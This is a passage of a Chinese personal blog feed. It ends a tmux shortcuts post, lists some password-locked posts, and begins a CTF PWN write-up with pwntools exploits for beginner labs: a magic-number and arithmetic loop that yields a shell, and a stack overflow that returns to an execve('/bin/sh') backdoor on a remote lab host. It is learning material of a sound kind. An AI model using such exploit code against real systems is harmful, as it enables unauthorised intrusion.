</code>，就可以通过方向键上下移动使用<code>PageUp</code>和<code>PageDown</code>可以实现上下翻页</p><h3 id="一些快捷键"><a href="#一些快捷键" class="headerlink" title="一些快捷键"></a>一些快捷键</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ctrl+b %：划分左右两个窗格。<br>Ctrl+b &quot;：划分上下两个窗格。<br>Ctrl+b &lt;arrow key&gt;：光标切换到其他窗格。&lt;arrow key&gt;是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。<br>Ctrl+b ;：光标切换到上一个窗格。<br>Ctrl+b o：光标切换到下一个窗格。<br>Ctrl+b &#123;：当前窗格与上一个窗格交换位置。<br>Ctrl+b &#125;：当前窗格与下一个窗格交换位置。<br>Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。<br>Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。<br>Ctrl+b x：关闭当前窗格。<br>Ctrl+b !：将当前窗格拆分为一个独立窗口。<br>Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。<br>Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。<br>Ctrl+b q：显示窗格编号。`在这里插入代码片`<br></code></pre></td></tr></table></figure><h3 id="一些补充操作："><a href="#一些补充操作：" class="headerlink" title="一些补充操作："></a>一些补充操作：</h3><p>列出所有会话：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux ls<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025劳动节出游反思</title>
    <link href="/2025%E4%BA%94%E4%B8%80%E5%8A%B3%E5%8A%A8%E8%8A%82%E5%87%BA%E8%A1%8C%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8F%8D%E6%80%9D/"/>
    <url>/2025%E4%BA%94%E4%B8%80%E5%8A%B3%E5%8A%A8%E8%8A%82%E5%87%BA%E8%A1%8C%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8F%8D%E6%80%9D/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="编码字符是UTF-8." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9767cd30b2cba977e2938d84ffec8289f076811a5412538acd798127db9bbd7d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是小周的生日哈</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>出行</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025劳动节出游规划</title>
    <link href="/%E4%BA%94%E4%B8%80%E5%8A%B3%E5%8A%A8%E8%8A%82%E5%87%BA%E6%B8%B8%E8%A7%84%E5%88%92/"/>
    <url>/%E4%BA%94%E4%B8%80%E5%8A%B3%E5%8A%A8%E8%8A%82%E5%87%BA%E6%B8%B8%E8%A7%84%E5%88%92/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="编码字符是UTF-8." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8fa7b6af1e1b2bec138811595563e87776e5277595310d7010c84e1b4b216494"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是小周的生日哈</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>出行</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Story_main_thread</title>
    <link href="/Story_main_thread/"/>
    <url>/Story_main_thread/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="格式是年月日例如20250303." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="290394b9eda44ad959e3a6d81249806bda54856aad9d9a26a9a6eebabed7ff46">c605a6a6a90cd74ffaacff13940df9696ac4e6f81cd2695cb7baae61674ceba420a61f9d713d41a3b0248c105c1ef64331e72316551cb0fdd110ac196e090699fafe71e54dc4c14bbe9ab585642a43c619a4736827f88180b4dadd172a490c3732bcc5740f963127a650a331f6931d4b5769a424fbd2ab3628839721000d70b2783fe6f26691063eb67927ee2731f540d2d67efe567863a8299af15438045e634794e8b8b2f6ef1f835ddb34450072c02a2bf2048db69b566e63ac6c6e0d01982e4bc0e65f25bdfa6e30b9699b3d602674222f921ab4124f27541902bc75319e82a3303d41d82051314e533e69bd1bbd20f8247648ef9be383e4cfe8dbb6e7d66b6a1c30c94bc4ce09f2bb09f00096d4228ce5eb7744c1fa258c38fa8adab408767a2f6a8984d46e89398c67a75fd1c85b3c9fd2909e20f62654c3b63b1b5712a4677f5a59890cb86331ac9b36c0f0c5ae5fd523a62784ea977c97ee268ebf5f31413690c75e203149161736f1a00065951c99b11e23a8cc305b412c37734e46037ec22da54c7d144c1e8c493627374948404c474ff66222c8875fd40826f6e97f4c23e628538556f897ef101e2765f90a060eacdfb639a6f82656a9aeeef372cc6731d441e1f14a42f42f74518609949070c0e8a7ab6caf0d2da219bc8251b3ea289da15782d3fd455c5bdd02ccf71ff5b8d95696f67b13abd18e36b84f79161ecf2eb407d8ae8b9ca67f4e97b7772b1b195d16fa7664ad73f5eea2203e57a7991b1bd34b31eef0a43e7eef225f8f0bc2829c430c2ba1076492be064d77b575ea9cf898b50c826cda2c4335c06e7dddb618dc53f735b44616818d8081ce26979e7ec17fedcce89f47725713eaf59a6b178ea8c0a98b1e10a28082c3bb15f072696e6277d2f13db1dd927ac6e4d4ff37d4d1cd5cb969491c11b04e03fe90517896cb50427bc1620fc58b9543d206ccd4a0c10ac27ce4af75e258f4f0d2f13da98eab6a2ee358771fae4c9595452a79986979e69fb2d50c5535db77fc0edf4674590ff58c9dbd660a864c5eead5f404b7f333f1802d05fe243245d97bc6d7aa3cfae14f332ee4cc8e21bca5fff5a0edffee14c3ec5142531c06f2f5745bf5a0e5f4019248b2da863a5280bc669d6129133090ba809ebe5378e223cdc3cf878bef52d66505127a21b16d1101c8ec078d9e5cb78028a6c4ae8e1605390bdf1c58e0dd76ddd411e99bdab298292adc487ff75d1358679a1d03984cb24bbe098942d6347a03d3d98067086a65b78542e88c02e8e106bbc02783c308653c32336e092346fa6390c822d6a4e0089845ede074e87d1943deadc507040c01636a70529e10bfd26506348c43557688d1ad6a4fd6bdafa4ff37b64815fc1189b736554d936f167c696572d6939d6f811e89bf26c900017b29d6a9da50dab21d5dcdeefc1d121c97298e05e1117237437ca69fc199321c89d95b4ec6c3090918bc58f668221b481b4515da5d5aecf144ba9a8c99f94151377f09b9f6d7a706ccc71831c9c977e14bf2bc3851985a06e59f132405c0aead58d40340af3c67826d23a8e441f255af3942410ba788629d23223808b037d27f488a000dd3731db4a96b16ce4140b0a79e3857594b779917bf3bb56421bc609aa20107bd687fb2052958e46556eed907c4993136a13571e9e92f100057f542625d47229eb1503fb8a6f2044b3418580a50dbf37e93d316d0828c22a1a7da9afb432e6d6c09ab915ae608a9cf927acf208205aa2d2d6bce5734ac2e2b1861a88bf9cb3d93d81101127b9fe4d8a339e5b568a6a77d729cf4cb6d77dc358d1b4cc53f9ab3e13e2e3f69c35e4ebafd2eb2a58edbed3331410ec46e3c70125d2df3b83ea9e356fbd72d2aa9f0c85195b081df790e70ae97a4d40cada6478e8f597bd15285ea9b2a69c737e15aecdcb70852234e3d3c90d7856412f7b93ac78e189316ec8402abaf2cb25121daf315437dfd94a5ddffdc25365e711d94d09f24524d5ab99d2baf39d1c386d17b58691c838e7410a5d61e27c42f2e7834ae568b9c22f54af1d87cdb8d0a6561ba7c4935405158f70c69a5f250a07ebe3d5e70586609c51597ae88ef62856a822c3cc50c6387248a9d82fbb3fe68c82955ce1526b83d2775965231553ffb7f864a0124b48368cb6e73dc995adae1f721975c1164dcb24a37930bc70ad78ff81270b9a5d4b63f26038b37a6e6f733dfd44d70b5fb69d1ac8bd84e1791fdc94e943f5ceeb0417707b064b1fd40cbbc89c45603d9c38ba4da6d2a15c307de44cfca9655818973d64baf76d0cd9b6d28edcdb8c853e0fd2bd9392aff246ddb84e8e763472af14a5e1c2d8fab87cdaf7f1e731434c7fb1be8d0d4d0e4334f1f8e259d614b5637d3385e3f93f7e07ddd0355fe1b22dc7da73c4ae8b3d858f28245baedc1a3bcc62470fe5bb3aaa0ec9519c860f825ddf7d50e00cc86d8c5593d14f1ad484be8012fd69fe16814bfd26a7d8c45c0e4f44581b9874e022ab627efa40178822f939f64d46622d1026cfa3dba52e179ffe0d614dcf665c5a7dc87f5bb314a3034c77ee0e8138d46b738d621518057439b4ece291d7e88ec23b1dbaa18d1346692837f2063b93f2c50da1f25ce627ec9276ad0a89c53d9d7514c199680f73aaa28bf3dd013660018a2abdb6bccbd1241e31d9a30f70c002c56e9687127c1f68776657ce66d0ce23352e67733c15751ac4cd5fe5312feffddb0f1f9675057445dc15bc170c739371775028bca8adb0599378b0de0525b499a56989228e8b7df668b9779eef1e05a5b65510d68cdabfbe0afc06aa5fc0cf31a6ce0b3b78e4aeffda522e7789a23e266b8549ad4fca4b967033f9c927ce330cfb114fef1addd3ee6568253af55f79c9fd5e29edd7285dc948103a00336a1ea621a7cd5d34e46d4134f22dafe11e2ea58764e583f9efd3d61bc9b28a528e3af21879d7e7134c03257180a1bcc6f7fbbad8c72dc2d816c9e8cf680f6c7064fe5e7e9f57bff22cff7b94ccc18a78f8ed6defe46373b1bc06eba14d642aaa1cd52555e106135396550f7c94e3b0b3af7fda2bf233e2a350b6ac74354ea8cb0d4db21109a24acf19da27ab416fa94f950b7bf55f7c20d7fd1fc32a09af704e6d9836be0a6ff446865ae8d767188049351f8ba562130dfaf812bd9ea01340398f1b396a9260ed84647d6dc74923f892e10cd051882cfd57b1ce964b831a89dd690dd2e0c787031d8fcdc177a477380eeafb1d75d3fe9709d5dc8776be16884f7c971edb604574e07614013a0f05b789d9e886d4f8ce7c5447368d6dcdede41adbc1492f3046cd868d67ee7ff6feb720e17b366dfc05ad430c4da7dfb6344cd4d39a1cea78264d8b935d782acfe67d866a1ae2715ee6bf7bf2be6a2dc05702036d2da734ce0e559ee5c780334734efc0e14cb09c7ae227ee3fc99f4d7859cfd1271268e159d6704477453d670fe69d2e8492c0938996528f6b36e338790c2f9f71884af8f457fe8fe44dc4622593a2a98b7a686fd210b7a96caa3162d573c022f16b9b7e22977358bed24294c8aad7fac33e049aff5165188e917b9e7ee5e25596d9b6bd9af30a05cb215f5d83dbf38e22b26958fc7ed273bb2ea1590379d5be37225bb6421200bbb2546551977da3e23967d56eb36713a4ef68ed263124cc150dc75b8eabb9e12a8fbcca0816f373a8918d01ad88d54897007007e91d9a233d7a540de395e9d66841a306374cfe9a026821c982b15dd6909ec77e38625e2a107c5142ef82dfc8edaf9e28e17d01ec37c013bc92a18bfb6d6262d1c5110f43b274d4711392461aa6c72abb96a75b482caef7e6dc6735d23ddfc1f9fc0ad882d4523ed3a9f236a59e1b120e1dbe46cf049e8bb4c86cdf3fa99e789ca7fe7284b8b5e8f850e50d225d039d4f889fb858a4df442892cd40702d98f1b69819800eb962e8e6b312d599848b4d7c24539b7797a19ad1c18a9c8792c49c9cce43c974691b3ae43d32ab400fbce331c03fb1801d204c2e1808d9ed80b240b9175b6a20afe488a9483434cdf039b0aeaa507c7be04ac3766275a2075f35882dd7f97f55149dbecc0f0cb3586114890d46bb98e47c252bbb71c588dbc496310bd635253340ffab7c2d7e6f30413738427ce4cf95cf41bf7dee3e5a254c7ff2f5e0c10bf18ba4b435173c3f651da1a3f94d895b5e805336b835221c0144960be634fedb208574756a6ce7239f392569cb561c1032b8ec675b5de974f35240c55de8392576a314f609acc8d75fff419eaf67490cdf5338731553eca632310e380b6f8b8691d72d74e3629ee0048601c86cc5397cf3c795ef74de277c72132314c9c66afe3ebca27e03ef66b333c9fb40dbe974ed06e512202ee83bc64ac6b6404738d27f22cf245dd598988444153f4e7ba50deffb8ee1fcd77a7bd19d00bd2b51cb069a0f16b607ff3d21368e9c2f0e03d15ef67e9000728ee6d8828897cb45e0f3a096e29bae6c14d9e022d8f30d9c42d57ee40f8e221d8c660b328fa24a04694c7e1668cc3078a5381165e20953974e7a1682ac955029b32281df4dfb11329e9ce9d07df915b5d995808bb782176847d6a842ac90ba4f13de1995d4e465f77ef3698b01652f76af9e2a603af8e6ef4165f977f1d2e9f4045066ba1a4bd8dbea482603ff09c862357ace07a0c0455161abff1ab3ce8a6535c76f0ab21020bc8768a69335cf747b1410bf40710b829ad0263d831ebcffc0434cbd8e94a0d7b93d43dd50977bcf5193bcddb083a1a6460a7bc59b878186c3e12b2cb7bcc9f1714bfd4e64dde8f1ff20cee21580c8de41f22edf1531d13c5242da414a7900bef13066b912550346b16a1b57db82cc198e9361f19bf4a733aee3e9165fc29692cc9de226d1584b10a35955a574c8dc03814ee17bf03b6539e8ea74c8d02b8ae8b6a2499e644231410f17a7ef9c03fd817386fb4544ed0196bbfbc7fe6a69de819f2692ad0905ee6d2a1c98541842410fb2ff0d8e142159d7c42b0cabac2fa4ae02e91778de483573f52f99664aa24fbd420ae14917eb54f1e308fa6db3e84e93906a893ad75ae1ac789f1541a4d8a8475b3b8fac7b2ef5402198d98983563dddc6a9a70f9318d6950dc07b8e6a12cb86f3724c0edf7c9a30be2005d91a8ad13b84def39c010393eaa2e604d811459ae41b6f576b05e771c0ff5eaa0c90366224d1bbf7fd2b97a1a32f5022aa4f696eb563873fb3485a4fd449b6da2ea6a52f238c2c22d5422180c93643fe2b7e6d67ab22037cf1844c1c4baebf5f21ee700b61ca787a84dd0ab4629250e690b4dadb47af20b11a759d594</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是你的生日.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>story</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSS_CTF题解</title>
    <link href="/SSS_CTF%E9%A2%98%E8%A7%A3/"/>
    <url>/SSS_CTF%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="SSS-CTF题解"><a href="#SSS-CTF题解" class="headerlink" title="SSS_CTF题解"></a>SSS_CTF题解</h1><h2 id="PWN入门部分"><a href="#PWN入门部分" class="headerlink" title="PWN入门部分"></a>PWN入门部分</h2><h3 id="Lab-0"><a href="#Lab-0" class="headerlink" title="Lab_0"></a>Lab_0</h3><p><strong>学习了p64()工具和利用python和靶机进行交互</strong></p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_0/Lab 0$ checksec pwntools<br>[*] &#x27;/mnt/d/copy/Lab_0/Lab 0/pwntools&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro："><a href="#IDA-Pro：" class="headerlink" title="IDA_Pro："></a>IDA_Pro：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [rsp+Ch] [rbp-24h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v11; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v11 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  signal(<span class="hljs-number">14</span>, handler);<br>  alarm(<span class="hljs-number">0132u</span>);<br>  seed = time(<span class="hljs-number">0LL</span>);<br>  srand(seed);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me the magic number :)&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4uLL</span>);<br>  <span class="hljs-keyword">if</span> ( buf != <span class="hljs-number">-559038737</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye~&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Complete 1000 math questions in 90 seconds!!!&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">999</span>; ++i )<br>  &#123;<br>    v8 = random() % <span class="hljs-number">0xFFFF</span>;<br>    v9 = random() % <span class="hljs-number">0xFFFF</span>;<br>    v10 = random() % <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">switch</span> ( v10 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d - %d = ?&quot;</span>, v8, v9);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>        <span class="hljs-keyword">if</span> ( v8 - v9 != v5 )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye Bye~&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d * %d = ?&quot;</span>, v8, v9);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>        <span class="hljs-keyword">if</span> ( v9 * v8 != v5 )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye Bye~&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d + %d = ?&quot;</span>, v8, v9);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>        <span class="hljs-keyword">if</span> ( v9 + v8 != v5 )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye Bye~&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good job!&quot;</span>);<br>  system(<span class="hljs-string">&quot;sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27; ,log_level=&#x27;debug&#x27;)<br><br>#p = process(&#x27;./pwntools&#x27;)<br>p = remote(&#x27;210.30.97.133&#x27;,28073)<br><br>payload1 = p32(3735928559)<br>p.recvuntil(b&#x27;Give me the magic number :)\n&#x27;)<br>p.send(payload1)<br>pause()<br>p.recvuntil(b&#x27;Complete 1000 math questions in 90 seconds!!!\n&#x27;)<br><br>for i in range(1000):<br>    expr = p.recvuntil(b&#x27; = ?&#x27;).replace(b&#x27; = ?&#x27;,b&#x27;&#x27;)<br>    print(expr)<br>    ans = eval(expr)<br>    p.sendline(str(ans))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>就是简单的将指定数字打包送入，再写循环解出对应的算式答案。</p><p><strong>注意的是，并不是64位的程序就对应p64打包，而是对应接受量的位数决定用什么打包，这里就是64位，但是打包是32位</strong></p><h3 id="Lab-1"><a href="#Lab-1" class="headerlink" title="Lab_1"></a>Lab_1</h3><p><strong>简单的栈溢出</strong></p><h4 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_1/Lab 1$ checksec bof<br>[*] &#x27;/mnt/d/copy/Lab_1/Lab 1/bof&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro：-1"><a href="#IDA-Pro：-1" class="headerlink" title="IDA_Pro："></a>IDA_Pro：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is your first bof challenge ;)&quot;</span>);<br>  fflush(_bss_start);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">y0u_c4n7_533_m3</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *envp; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">char</span> *argv; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br><br>  envp = <span class="hljs-number">0LL</span>;<br>  argv = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">return</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, &amp;argv, &amp;envp);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>#p = process(&#x27;./bof&#x27;)<br>p = remote(&#x27;210.30.97.133&#x27;,28021)<br>backdoor_func_addr = p64(0x0000000000400607)<br><br>payload = b&#x27;a&#x27; * (16 + 8) + backdoor_func_addr<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Lab-2"><a href="#Lab-2" class="headerlink" title="Lab_2:"></a>Lab_2:</h3><p><strong>简单栈溢出的基础上加了点汇编代码的阅读，确定具体需要跳转的位置</strong></p><h4 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_2/Lab 2$ checksec bof2<br>[*] &#x27;/mnt/d/copy/Lab_2/Lab 2/bof2&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 